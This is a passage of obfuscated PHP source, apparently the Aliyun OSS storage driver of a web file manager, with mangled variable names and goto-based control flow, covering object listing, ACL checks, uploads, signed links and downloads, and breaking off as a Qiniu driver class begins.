$añÕòÈ˜º[85] => $this->getPathOuter($añÕòÈ˜º[8] . $d”åˆ‡™Ú), $añÕòÈ˜º[29] => $añÕòÈ˜º[86]); if ($DĞ®‚ÒÀÆ”) { return $C¹…¢‚à; } goto eÓéÕ°ÁËÕ; AµÑ¢»–ÚÃ: if (isset($b²ÈÙºŞè[$añÕòÈ˜º[93]])) { $C¹…¢‚à[$añÕòÈ˜º[93]] = $b²ÈÙºŞè[$añÕòÈ˜º[93]]; } if (isset($b²ÈÙºŞè[$añÕòÈ˜º[202]])) { $C¹…¢‚à[$añÕòÈ˜º[202]] = $b²ÈÙºŞè[$añÕòÈ˜º[202]]; } return $C¹…¢‚à; goto Aïš¾…¶ºÂ; eÓéÕ°ÁËÕ: $C¹…¢‚à[$añÕòÈ˜º[202]] = $C¹…¢‚à[$añÕòÈ˜º[93]] = 0; $C¹…¢‚à[$añÕòÈ˜º[203]] = $C¹…¢‚à[$añÕòÈ˜º[204]] = !0; if (empty($b²ÈÙºŞè)) { $d”åˆ‡™Ú = rtrim($d”åˆ‡™Ú, $añÕòÈ˜º[8]) . $añÕòÈ˜º[8]; $F§Ü¶ñˆ£É = $this->objectMeta($d”åˆ‡™Ú); if (!$F§Ü¶ñˆ£É) { return $C¹…¢‚à; } $b²ÈÙºŞè = array($añÕòÈ˜º[202] => $F§Ü¶ñˆ£É[$añÕòÈ˜º[1242]][$añÕòÈ˜º[1243]], $añÕòÈ˜º[93] => strtotime($F§Ü¶ñˆ£É[$añÕòÈ˜º[1235]])); } goto AµÑ¢»–ÚÃ; Aïš¾…¶ºÂ: } public function listPath($A†—ÚÒô, $BÁ Ğ¥á…¤ = false) { $d‹¹÷Ö‘Ä =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fÜØí™»” = $this->fileList($A†—ÚÒô, $d‹¹÷Ö‘Ä[8], !0); foreach ($fÜØí™»”[$d‹¹÷Ö‘Ä[84]] as $Döáí¹â™à => $FÖç°ã×ĞÅ) { $fÜØí™»”[$d‹¹÷Ö‘Ä[84]][$Döáí¹â™à] = $this->folderInfo($FÖç°ã×ĞÅ, $BÁ Ğ¥á…¤, $FÖç°ã×ĞÅ); } foreach ($fÜØí™»”[$d‹¹÷Ö‘Ä[83]] as $Döáí¹â™à => $FÖç°ã×ĞÅ) { $fÜØí™»”[$d‹¹÷Ö‘Ä[83]][$Döáí¹â™à] = $this->fileInfo($FÖç°ã×ĞÅ[$d‹¹÷Ö‘Ä[28]], $BÁ Ğ¥á…¤, $FÖç°ã×ĞÅ); } return $fÜØí™»”; } public function has($FÍÎ­Ä›œ’, $cò®øÂ·‚è = false, $E®İ‰í¥‘µ = true) { goto cƒ®¸È³ª; CàÒï‹ñÔ£: $AÜŸ„Š‹©¸ = $EÕêù™»ê[33]; $A÷‡˜îÇÁÀ = 500; $D•„†ÕÁÚ = $e±Ëùë‚¤ñ = 0; goto bÆ¾º‰Ôğ; bÆ¾º‰Ôğ: while (!0) { check_abort(); $eƒÑ±£Õ°Î = array($EÕêù™»ê[1230] => $EÕêù™»ê[8], $EÕêù™»ê[1231] => $F¸è³ØÛğ‰, $EÕêù™»ê[1232] => $A÷‡˜îÇÁÀ, $EÕêù™»ê[1233] => $AÜŸ„Š‹©¸); try { $BÏÍ§Œ¯©‡ = $this->client->listObjects($this->bucket, $eƒÑ±£Õ°Î); } catch (OSS\Core\OssException $d‰ç¤¯å¯¤) { break; } $AÜŸ„Š‹©¸ = $BÏÍ§Œ¯©‡->getNextMarker(); $AŒ‰òãùå¿ = $BÏÍ§Œ¯©‡->getObjectList(); $D¨´Ç±×ïœ = $BÏÍ§Œ¯©‡->getPrefixList(); if ($cò®øÂ·‚è) { if (count($AŒ‰òãùå¿) > 1 || count($AŒ‰òãùå¿) == 1 && $AŒ‰òãùå¿[0]->getKey() != $F¸è³ØÛğ‰) { $D•„†ÕÁÚ += count($AŒ‰òãùå¿) - 1; } if (!empty($D¨´Ç±×ïœ)) { $e±Ëùë‚¤ñ += count($D¨´Ç±×ïœ); } if ($AÜŸ„Š‹©¸ === $EÕêù™»ê[33]) { break; } continue; } if ($E®İ‰í¥‘µ) { if (!empty($AŒ‰òãùå¿)) { if (count($AŒ‰òãùå¿) > 1 || $AŒ‰òãùå¿[0]->getKey() != $F¸è³ØÛğ‰) { return !0; } } } else { if (!empty($D¨´Ç±×ïœ)) { return !0; } } if ($AÜŸ„Š‹©¸ === $EÕêù™»ê[33]) { break; } } if ($cò®øÂ·‚è) { return array($EÕêù™»ê[211] => $D•„†ÕÁÚ, $EÕêù™»ê[212] => $e±Ëùë‚¤ñ); } return !1; goto fÌÙáÉ¿Ë±; cƒ®¸È³ª: $EÕêù™»ê =& $_SERVER[í¤âËÚ£¶íÊ¢]; $FÍÎ­Ä›œ’ = trim($FÍÎ­Ä›œ’, $EÕêù™»ê[8]); $F¸è³ØÛğ‰ = empty($FÍÎ­Ä›œ’) ? $EÕêù™»ê[33] : $FÍÎ­Ä›œ’ . $EÕêù™»ê[8]; goto CàÒï‹ñÔ£; fÌÙáÉ¿Ë±: } public function listAll($Fø½×õï½×) { $D ›Çíåà =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EÕÎŒ–Î¦ô = $this->fileList($Fø½×õï½×, $D ›Çíåà[33], !0); $D¥ö¨Ãù½İ = array(); foreach ($EÕÎŒ–Î¦ô[$D ›Çíåà[83]] as $AÚ™–Ş¸ŞŠ) { $D¥ö¨Ãù½İ[$AÚ™–Ş¸ŞŠ[$D ›Çíåà[28]]] = $AÚ™–Ş¸ŞŠ[$D ›Çíåà[87]]; } foreach ($EÕÎŒ–Î¦ô[$D ›Çíåà[84]] as $AÚ™–Ş¸ŞŠ) { if (is_string($AÚ™–Ş¸ŞŠ)) { $D¥ö¨Ãù½İ[$AÚ™–Ş¸ŞŠ] = 0; } } return $this->listAllFiles($Fø½×õï½×, array_keys($D¥ö¨Ãù½İ), $D¥ö¨Ãù½İ); } public function canRead($Föš±İÚÌ¸) { $c• Ù•ä¡ì =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bÇŒ„Ú¶Üë = $this->pathAcl($Föš±İÚÌ¸); return $bÇŒ„Ú¶Üë == $c• Ù•ä¡ì[1244] || $bÇŒ„Ú¶Üë == $c• Ù•ä¡ì[523] ? !0 : !1; } public function canWrite($FˆĞÎ¾õãÈ) { $e¯ø£ã¡Ü“ = $this->pathAcl($FˆĞÎ¾õãÈ); return $e¯ø£ã¡Ü“ == $_SERVER[í¤âËÚ£¶íÊ¢][523] ? !0 : !1; } public function pathAcl($B…ãˆÊåã±) { goto C‡ˆ»¿ˆ¨©; C‡ˆ»¿ˆ¨©: $c¼ê–÷É°¹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $d›Æ“¸­Š¿ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($B…ãˆÊåã±)); } catch (OSS\Core\OssException $cæÒòôëÓÑ) { return !1; } goto a°çÊÖ¹ÙÒ; a°çÊÖ¹ÙÒ: $e®â°šÂ¦¥ = $d›Æ“¸­Š¿ == $c¼ê–÷É°¹[34] ? $this->bucketAcl : $d›Æ“¸­Š¿; if ($e®â°šÂ¦¥ == $c¼ê–÷É°¹[1245]) { return $c¼ê–÷É°¹[1244]; } if ($e®â°šÂ¦¥ == $c¼ê–÷É°¹[1246]) { return $c¼ê–÷É°¹[523]; } goto DŠÆîšÅ“; DŠÆîšÅ“: return $e®â°šÂ¦¥; goto CÂÔë‘¦Åº; CÂÔë‘¦Åº: } private function chmodPath($CÎ¥Àí÷, $eØ´Œ¶¶ÍÂ = '') { $c–öÍÙİÇÊ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aâÂŞ·šì = empty($eØ´Œ¶¶ÍÂ) ? $c–öÍÙİÇÊ[1246] : $eØ´Œ¶¶ÍÂ; $b®·¥Åâù“ = array($c–öÍÙİÇÊ[34], $c–öÍÙİÇÊ[200], $c–öÍÙİÇÊ[1245], $c–öÍÙİÇÊ[1246]); if (!in_array($aâÂŞ·šì, $b®·¥Åâù“)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($CÎ¥Àí÷), $aâÂŞ·šì); } catch (OSS\Core\OssException $dÑ…™¯ä¼³) { return !1; } return !0; } public function getContent($AãÇñß’…²) { return $this->fileSubstr($AãÇñß’…², -1); } public function setContent($Bòêò¹±ÉÀ, $aÚ¿ÉÎÜâø = '') { $bÏ‰‚³Ãå  =& $_SERVER[í¤âËÚ£¶íÊ¢]; try { $C‰¹ŒÂ§‘ = $this->trafficLimit($bÏ‰‚³Ãå [1247]); $fö„›æí‘µ = $this->client->putObject($this->bucket, $this->pathEncode($Bòêò¹±ÉÀ), $aÚ¿ÉÎÜâø, $C‰¹ŒÂ§‘); } catch (OSS\Core\OssException $cáìì…”à) { return !1; } $e‚‹‚Ò˜ó— = array($bÏ‰‚³Ãå [1236] => trim($fö„›æí‘µ[$bÏ‰‚³Ãå [1248]], $bÏ‰‚³Ãå [125]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Bòêò¹±ÉÀ))); $this->updateObjMeta($Bòêò¹±ÉÀ, $e‚‹‚Ò˜ó—); return isset($fö„›æí‘µ[$bÏ‰‚³Ãå [1249]][$bÏ‰‚³Ãå [1195]]) ? !0 : !1; } private function updateObjMeta($b»°¨Øâ¢ê, $EÎ£¸ÛãÊ) { $b»°¨Øâ¢ê = $this->pathEncode($b»°¨Øâ¢ê); try { $cÌÃ‘éÚÜ‹ = array(OSS\OssClient::OSS_HEADERS => $EÎ£¸ÛãÊ); $this->client->copyObject($this->bucket, $b»°¨Øâ¢ê, $this->bucket, $b»°¨Øâ¢ê, $cÌÃ‘éÚÜ‹); } catch (OSS\Core\OssException $CË¤®ËÊÑÑ) { return !1; } return !0; } public function upload($C°Â¥Ëµå‹, $fÜ¶Â¿ˆÌ, $cÏ»»¤¤»Œ = false, $f£õ‘Û‡…ë = REPEAT_REPLACE) { $a§íô­Ö =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eÕãÍÓ«—à = trim($C°Â¥Ëµå‹, $a§íô­Ö[8]); $EöŒ¾ËòÖº = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($a§íô­Ö[1236] => @md5_file($fÜ¶Â¿ˆÌ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($C°Â¥Ëµå‹))); $EöŒ¾ËòÖº = $this->trafficLimit($a§íô­Ö[1247], $EöŒ¾ËòÖº); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($eÕãÍÓ«—à), $fÜ¶Â¿ˆÌ, $EöŒ¾ËòÖº); } catch (OSS\Core\OssException $aÏß¤çĞôƒ) { return !1; } return $this->getPathOuter($C°Â¥Ëµå‹); } public function getHost() { $eØêéØ˜µ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B‘‹¼ÃŠ™ = explode($eØêéØ˜µ[186], parent::getHost()); return $B‘‹¼ÃŠ™[0] . $eØêéØ˜µ[186] . $this->bucket . $eØêéØ˜µ[104] . $B‘‹¼ÃŠ™[1]; } public function uploadFormData($CÃëÈÍæ¥, $câÌ°åÌé„ = 3600) { goto Dôôø¤œ÷ö; Dôôø¤œ÷ö: $bÔÁåÁÆŞñ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!($eº±¸ÖßÊà = $this->getHost())) { return !1; } $fˆ¯²Š¼¥° = $câÌ°åÌé„; goto e®Âß³±²; AÎÕÑÒ”»: $d‘ëùİ øª = base64_encode(hash_hmac($bÔÁåÁÆŞñ[237], $a…ê–Œ‹îÜ, $this->secret, !0)); $e•Ò²ƒŒ„ = array($bÔÁåÁÆŞñ[1159] => $a…ê–Œ‹îÜ, $bÔÁåÁÆŞñ[1253] => $this->accessKey, $bÔÁåÁÆŞñ[1155] => $bÔÁåÁÆŞñ[1147], $bÔÁåÁÆŞñ[1254] => $d‘ëùİ øª, $bÔÁåÁÆŞñ[184] => $eº±¸ÖßÊà); $e•Ò²ƒŒ„ = $this->trafficLimit($bÔÁåÁÆŞñ[1247], $e•Ò²ƒŒ„); goto DØíàšÍæŠ; Dˆ…Úõœó¢: $b“­ªö×ç = $this->pathFather($CÃëÈÍæ¥); $e‘Æ¥¾ˆÓ™ = array($bÔÁåÁÆŞñ[1149] => $A¹Ü¿Ğ™ğÜ, $bÔÁåÁÆŞñ[1150] => array(array($bÔÁåÁÆŞñ[1252], 0, $BÎ‰ì×İÏ), array($bÔÁåÁÆŞñ[1153], $bÔÁåÁÆŞñ[1154], $b“­ªö×ç))); $a…ê–Œ‹îÜ = base64_encode(json_encode($e‘Æ¥¾ˆÓ™)); goto AÎÕÑÒ”»; f¿…›ø­‘Œ: $f×‹‘ÆÌ = strpos($A¹Ü¿Ğ™ğÜ, $bÔÁåÁÆŞñ[301]); $A¹Ü¿Ğ™ğÜ = substr($A¹Ü¿Ğ™ğÜ, 0, $f×‹‘ÆÌ) . $bÔÁåÁÆŞñ[1251]; $BÎ‰ì×İÏ = 1048576000 * 5; goto Dˆ…Úõœó¢; e®Âß³±²: $e˜é¡‰î†¨ = date($bÔÁåÁÆŞñ[1250], time() + $fˆ¯²Š¼¥°); $BÚ…¸ÒšË = new DateTime($e˜é¡‰î†¨); $A¹Ü¿Ğ™ğÜ = $BÚ…¸ÒšË->format(DateTime::ISO8601); goto f¿…›ø­‘Œ; DØíàšÍæŠ: return $e•Ò²ƒŒ„; goto Eè‰‡²§»œ; Eè‰‡²§»œ: } public function multiUploadFormData($d‰‘ŸÍ”Ó–, $eÒÄò‰­¤É = 3600) { $E³Ô´„ŒµĞ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!($AîÑ±óíÇ„ = $this->getHost())) { return !1; } $EõÌ§¹ãØë = $this->trafficLimit($E³Ô´„ŒµĞ[1247]); $AÚÖôÜ±“ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($d‰‘ŸÍ”Ó–), $EõÌ§¹ãØë); return array($E³Ô´„ŒµĞ[229] => $AÚÖôÜ±“, $E³Ô´„ŒµĞ[184] => $AîÑ±óíÇ„ . $E³Ô´„ŒµĞ[8] . $this->pathEncode($d‰‘ŸÍ”Ó–), $E³Ô´„ŒµĞ[230] => gmdate($E³Ô´„ŒµĞ[1255]), $E³Ô´„ŒµĞ[102] => $d‰‘ŸÍ”Ó–); } public function multiUploadAuthData($e­Ò‰Ğ§—©, $AÓ×á™·¼Ì = array()) { goto A¥İ¾’…³ß; Fªëê‚·í±: $fœöÑ¿•ê = $eèÔ…„Õ¿Ê[1220] . $this->accessKey . $eèÔ…„Õ¿Ê[4] . $D÷îİÉù¾‰; if (strpos($C†Ïİ¹´», $eèÔ…„Õ¿Ê[233]) === 0) { $fœöÑ¿•ê = array($eèÔ…„Õ¿Ê[239] => $fœöÑ¿•ê, $eèÔ…„Õ¿Ê[230] => $eêµ”¥å›Ş); if ($E×š¸§ô‡ˆ) { $fœöÑ¿•ê = array_merge($fœöÑ¿•ê, $E×š¸§ô‡ˆ); } } return $fœöÑ¿•ê; goto E‡‚÷Ê¾ä; F©Æïëó¸¹: $DÁ’ÄÂÌ‹Ñ = $e­Ò‰Ğ§—©; if (isset($AÓ×á™·¼Ì[$eèÔ…„Õ¿Ê[102]])) { $DÁ’ÄÂÌ‹Ñ = $AÓ×á™·¼Ì[$eèÔ…„Õ¿Ê[102]]; unset($AÓ×á™·¼Ì[$eèÔ…„Õ¿Ê[102]]); } if (isset($AÓ×á™·¼Ì[$eèÔ…„Õ¿Ê[231]])) { $AÓ×á™·¼Ì[$eèÔ…„Õ¿Ê[230]] = $eêµ”¥å›Ş; return $this->listUploadParts($DÁ’ÄÂÌ‹Ñ, $AÓ×á™·¼Ì); } goto AØ³ÌéÁ¢; C”Ê‹‹ÑÜè: if (!empty($AÓ×á™·¼Ì[$eèÔ…„Õ¿Ê[1257]])) { $f—Â¾‚ªÆ” = array_merge(array($b“‚Æ’Éôæ[4]), $AÓ×á™·¼Ì[$eèÔ…„Õ¿Ê[1257]]); sort($f—Â¾‚ªÆ”); $b“‚Æ’Éôæ[4] = implode($eèÔ…„Õ¿Ê[63], $f—Â¾‚ªÆ”); } $bŠöàê«ö = implode($eèÔ…„Õ¿Ê[63], $b“‚Æ’Éôæ); $D÷îİÉù¾‰ = base64_encode(hash_hmac($eèÔ…„Õ¿Ê[237], $bŠöàê«ö, $this->secret, !0)); goto Fªëê‚·í±; A¥İ¾’…³ß: $eèÔ…„Õ¿Ê =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eêµ”¥å›Ş = isset($AÓ×á™·¼Ì[$eèÔ…„Õ¿Ê[230]]) ? $AÓ×á™·¼Ì[$eèÔ…„Õ¿Ê[230]] : gmdate($eèÔ…„Õ¿Ê[1255]); $C†Ïİ¹´» = isset($AÓ×á™·¼Ì[$eèÔ…„Õ¿Ê[177]]) ? $AÓ×á™·¼Ì[$eèÔ…„Õ¿Ê[177]] : $eèÔ…„Õ¿Ê[33]; goto F©Æïëó¸¹; AØ³ÌéÁ¢: $b“‚Æ’Éôæ = array($eèÔ…„Õ¿Ê[232], $eèÔ…„Õ¿Ê[33], $eèÔ…„Õ¿Ê[128], $eêµ”¥å›Ş, "\x78\x2d\157\x73\163\x2d\144\141\x74\x65\72{$eêµ”¥å›Ş}", $eèÔ…„Õ¿Ê[8] . $this->bucket . $eèÔ…„Õ¿Ê[8] . $DÁ’ÄÂÌ‹Ñ . $C†Ïİ¹´»); if (strpos($C†Ïİ¹´», $eèÔ…„Õ¿Ê[233]) === 0) { $b“‚Æ’Éôæ[0] = $eèÔ…„Õ¿Ê[234]; if ($E×š¸§ô‡ˆ = $this->trafficLimit($eèÔ…„Õ¿Ê[1247])) { $DÁ’ÄÂÌ‹Ñ = $eèÔ…„Õ¿Ê[1256]; array_splice($b“‚Æ’Éôæ, 5, 0, $DÁ’ÄÂÌ‹Ñ . $eèÔ…„Õ¿Ê[4] . $E×š¸§ô‡ˆ[$DÁ’ÄÂÌ‹Ñ]); } } if (isset($AÓ×á™·¼Ì[$eèÔ…„Õ¿Ê[235]]) && $AÓ×á™·¼Ì[$eèÔ…„Õ¿Ê[235]] == $eèÔ…„Õ¿Ê[236]) { $b“‚Æ’Éôæ[0] = $eèÔ…„Õ¿Ê[236]; } goto C”Ê‹‹ÑÜè; E‡‚÷Ê¾ä: } public function listUploadParts($bó¸Ã–­½½, $AÖïËÂ‡ó) { goto bœ‡Ëµß; cïßç¹‡¿ø: return array($cØ¡©˜‹â[239] => $d¯ïìâÛî, $cØ¡©˜‹â[230] => $AÖïËÂ‡ó[$cØ¡©˜‹â[230]], $cØ¡©˜‹â[241] => $D¯•¸‡ø’÷); goto f¢îÃßùƒ; eÚ•ÚÀòÒŒ: $b™ƒœÙõò» = $aºÒŞ—‰¿->getListPart(); $D¯•¸‡ø’÷ = array(); foreach ($b™ƒœÙõò» as $aƒÑİ¹«ìÓ) { $D¯•¸‡ø’÷[] = array($cØ¡©˜‹â[1240] => $aƒÑİ¹«ìÓ->getPartNumber(), $cØ¡©˜‹â[1241] => trim($aƒÑİ¹«ìÓ->getETag(), $cØ¡©˜‹â[125])); } goto aÂöèğÌù›; bœ‡Ëµß: $cØ¡©˜‹â =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cßçáîĞÈŠ = parse_url_query($AÖïËÂ‡ó[$cØ¡©˜‹â[177]]); $aºÒŞ—‰¿ = $this->client->listParts($this->bucket, $this->pathEncode($bó¸Ã–­½½), $cßçáîĞÈŠ[$cØ¡©˜‹â[229]]); goto eÚ•ÚÀòÒŒ; aÂöèğÌù›: unset($AÖïËÂ‡ó[$cØ¡©˜‹â[231]], $AÖïËÂ‡ó[$cØ¡©˜‹â[235]]); $d¯ïìâÛî = $this->multiUploadAuthData($bó¸Ã–­½½, $AÖïËÂ‡ó); if (empty($d¯ïìâÛî)) { return !1; } goto cïßç¹‡¿ø; f¢îÃßùƒ: } public function download($AóÙŠÈ«œ—, $dÙİµ†¿ÁŠ) { if ($this->isFolder($AóÙŠÈ«œ—)) { return !1; } try { $f¡Á’“ƒ¼ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $dÙİµ†¿ÁŠ); $f¡Á’“ƒ¼ = $this->trafficLimit($_SERVER[í¤âËÚ£¶íÊ¢][118], $f¡Á’“ƒ¼); $this->client->getObject($this->bucket, $this->pathEncode($AóÙŠÈ«œ—), $f¡Á’“ƒ¼); } catch (OSS\Core\OssException $FÓÔå–Ûñ ) { return !1; } return $dÙİµ†¿ÁŠ; } public function fileSubstr($fŒÑ†¡¿¥, $B½ÎÅ‡ó­« = 0, $cøîÒêÂ = false) { if ($B½ÎÅ‡ó­« === -1) { $CëÊÜ³Ûó… = array(); } else { if ($cøîÒêÂ === !1) { $d¬®à…ÒË = $this->size($fŒÑ†¡¿¥); } else { $d¬®à…ÒË = $B½ÎÅ‡ó­« + $cøîÒêÂ - 1; } $CëÊÜ³Ûó… = array(OSS\OssClient::OSS_RANGE => "{$B½ÎÅ‡ó­«}\55{$d¬®à…ÒË}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($fŒÑ†¡¿¥), $CëÊÜ³Ûó…); } catch (OSS\Core\OssException $A¿ğ¯¼ˆ¼) { think_exception($A¿ğ¯¼ˆ¼->getMessage()); return !1; } } private function trafficLimit($C‚•ŠÎÚÜÆ, $eŠá‚Ïæçç = array()) { goto bö¿Ö†…è; bö¿Ö†…è: $cäÀÈÈæª‹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($C‚•ŠÎÚÜÆ == $cäÀÈÈæª‹[1247] && $this->isUploadServer() || $C‚•ŠÎÚÜÆ == $cäÀÈÈæª‹[118] && $this->isFileOutServer()) { return $eŠá‚Ïæçç; } $B…µº ´â = floatval($GLOBALS[$cäÀÈÈæª‹[6]][$cäÀÈÈæª‹[97]][$cäÀÈÈæª‹[116]][$C‚•ŠÎÚÜÆ]) * 1024 * 1024 * 8; goto F¥ù¡À¹Œ; E‘Åò°¤„: return $eŠá‚Ïæçç; goto D…ğèí‚Ìß; F¥ù¡À¹Œ: if (!$B…µº ´â) { return $eŠá‚Ïæçç; } $B…µº ´â = $B…µº ´â < 819200 ? 819200 : ($B…µº ´â > 838860800 ? 838860800 : $B…µº ´â); $eŠá‚Ïæçç[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($B…µº ´â); goto E‘Åò°¤„; D…ğèí‚Ìß: } public function link($EØˆƒ®á’é, $eç²†£†¦ = array()) { $d†Å”ßÚÈ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->exist($EØˆƒ®á’é) || $this->isFolder($EØˆƒ®á’é)) { return !1; } try { $eç²†£†¦ = $this->trafficLimit($d†Å”ßÚÈ[118], $eç²†£†¦); $aµª¾ßàóù = $this->client->signUrl($this->bucket, $this->pathEncode($EØˆƒ®á’é), 3600 * 12, $d†Å”ßÚÈ[236], $eç²†£†¦); return $this->getCdnLink($aµª¾ßàóù); } catch (OSS\Core\OssException $EèŒèÒ¿¸ô) { return !1; } } public function fileOut($B‚œÎ“ùó, $fÖ’¸Şƒ ö = false, $Cª‰ô¬” = false, $AåßêÊ²ä = '') { goto fóÙøÃÒ õ; fËÒùš” : $fÖ’¸Şƒ ö = $fÖ’¸Şƒ ö ? $EÔê™³•Íí[222] : $EÔê™³•Íí[223]; $A®È£ˆí×õ = array(OSS\OssClient::OSS_SUB_RESOURCE => $EÔê™³•Íí[1258] . rawurlencode("{$fÖ’¸Şƒ ö}\x3b\146\x69\154\145\156\x61\155\x65\75{$Cª‰ô¬”}")); $A®È£ˆí×õ[OSS\OssClient::OSS_SUB_RESOURCE] .= $EÔê™³•Íí[1259] . rawurlencode($F ¦¤“±º¡); goto fö‚ï§ƒ‰; Bá×Ì·Ú½: $Cª‰ô¬” = rawurlencode($Cª‰ô¬”); $F ¦¤“±º¡ = get_file_mime(get_path_ext($Cª‰ô¬”)); if ($F ¦¤“±º¡ == $EÔê™³•Íí[221]) { return parent::fileOut($B‚œÎ“ùó, $fÖ’¸Şƒ ö, $Cª‰ô¬”, $AåßêÊ²ä); } goto fËÒùš” ; fóÙøÃÒ õ: $EÔê™³•Íí =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($this->isFileOutServer()) { return $this->fileOutServer($B‚œÎ“ùó, $fÖ’¸Şƒ ö, $Cª‰ô¬”, $AåßêÊ²ä); } if (!$Cª‰ô¬”) { $Cª‰ô¬” = $this->pathThis($B‚œÎ“ùó); } goto Bá×Ì·Ú½; fö‚ï§ƒ‰: $d–ÃŠöø­ø = $this->link($B‚œÎ“ùó, $A®È£ˆí×õ); $this->fileOutLink($d–ÃŠöø­ø); goto d…öô‹¯¼Ÿ; d…öô‹¯¼Ÿ: } public function fileOutServer($däÄèÌ¾ÌĞ, $BòõÛŒèÆ = false, $eÔç‚µôŒÀ = false, $eê†Ü»š‘Ï = '') { parent::fileOut($däÄèÌ¾ÌĞ, $BòõÛŒèÆ, $eÔç‚µôŒÀ, $eê†Ü»š‘Ï); } public function fileOutImage($b°ñô”ô‡, $fÁ¸Í ®†ˆ = 250) { $CŒ½ÓßÊ± = array(OSS\OssClient::OSS_PROCESS => $_SERVER[í¤âËÚ£¶íÊ¢][1260] . $fÁ¸Í ®†ˆ); $F’ÔÁ¹Ù¸ = $this->link($b°ñô”ô‡, $CŒ½ÓßÊ±); $this->fileOutLink($F’ÔÁ¹Ù¸); } public function fileOutImageServer($F’İ“ªíâã, $f‡Ö¦ÊŒƒ = 250) { parent::fileOutImage($F’İ“ªíâã, $f‡Ö¦ÊŒƒ); } public function fileOutLink($D©Èã·¿¹×) { $F×ö¨Şå =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->isCdnHost() && substr($D©Èã·¿¹×, 0, 7) == $F×ö¨Şå[1162]) { $D©Èã·¿¹× = $F×ö¨Şå[1163] . substr($D©Èã·¿¹×, 7); } header($F×ö¨Şå[168] . $D©Èã·¿¹×); die; } public function hashMd5($AÄ·¸…£”, $AãÀ¨…¥›¨ = '') { $E¥Ğ†Šô” =& $_SERVER[í¤âËÚ£¶íÊ¢]; $C¼­øÃ´Ä¿ = $this->_objectMeta($AÄ·¸…£”); if (!$C¼­øÃ´Ä¿) { return $E¥Ğ†Šô”[33]; } if (!isset($C¼­øÃ´Ä¿[$E¥Ğ†Šô”[1236]]) && !empty($AãÀ¨…¥›¨)) { $CÀªæÂç™Ò = $this->updateObjMeta($AÄ·¸…£”, array($E¥Ğ†Šô”[1236] => $AãÀ¨…¥›¨)); $C¼­øÃ´Ä¿[$E¥Ğ†Šô”[1236]] = $CÀªæÂç™Ò ? $AãÀ¨…¥›¨ : $E¥Ğ†Šô”[33]; } return isset($C¼­øÃ´Ä¿[$E¥Ğ†Šô”[1236]]) ? strtolower($C¼­øÃ´Ä¿[$E¥Ğ†Šô”[1236]]) : $E¥Ğ†Šô”[33]; } public function size($E¨²»·‹¯) { $eáÒî¿Ê = $this->objectMeta($E¨²»·‹¯); return $eáÒî¿Ê ? $eáÒî¿Ê[$_SERVER[í¤âËÚ£¶íÊ¢][87]] : 0; } public function info($bÉ³õìôÍÅ) { if ($this->isFolder($bÉ³õìôÍÅ)) { return $this->folderInfo($bÉ³õìôÍÅ); } else { if ($this->isFile($bÉ³õìôÍÅ)) { return $this->fileInfo($bÉ³õìôÍÅ); } } return !1; } public function exist($AÆ¼›Üùµ) { return $this->isFile($AÆ¼›Üùµ) || $this->isFolder($AÆ¼›Üùµ); } public function isFile($aî¾½©‰’’) { return !$this->isFolder($aî¾½©‰’’) && $this->objectMeta($aî¾½©‰’’); } public function isFolder($e²¾©ï«ç‡) { return $this->cacheMethod($_SERVER[í¤âËÚ£¶íÊ¢][207], $e²¾©ï«ç‡); } protected function objectMeta($Eª‘»Æšİ¨) { return $this->cacheMethod($_SERVER[í¤âËÚ£¶íÊ¢][208], $Eª‘»Æšİ¨); } protected function _objectMeta($d„İ‰¾ë„É) { $dÔé‚ñ¡Š =& $_SERVER[í¤âËÚ£¶íÊ¢]; try { $EÌËÄŒ¨º = $this->client->getObjectMeta($this->bucket, $this->pathEncode($d„İ‰¾ë„É)); } catch (OSS\Core\OssException $EâéÎ”ˆìÜ) { $EÌËÄŒ¨º = !1; } if ($EÌËÄŒ¨º) { $EÌËÄŒ¨º[$dÔé‚ñ¡Š[87]] = intval($EÌËÄŒ¨º[$dÔé‚ñ¡Š[1234]]); } return $EÌËÄŒ¨º; } protected function _isFolder($EÈìöíÙ“Ş) { $c°Æ‰åÜ®õ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($EÈìöíÙ“Ş == $c°Æ‰åÜ®õ[33] || $EÈìöíÙ“Ş == $c°Æ‰åÜ®õ[8]) { return !0; } $F¿Ï«á¢ = array($c°Æ‰åÜ®õ[1230] => $c°Æ‰åÜ®õ[8], $c°Æ‰åÜ®õ[1231] => rtrim($EÈìöíÙ“Ş, $c°Æ‰åÜ®õ[8]) . $c°Æ‰åÜ®õ[8], $c°Æ‰åÜ®õ[1232] => 1, $c°Æ‰åÜ®õ[1233] => $c°Æ‰åÜ®õ[33]); $e Å™‘©äß = $this->client->listObjects($this->bucket, $F¿Ï«á¢); if ($e Å™‘©äß->getObjectList() || $e Å™‘©äß->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public 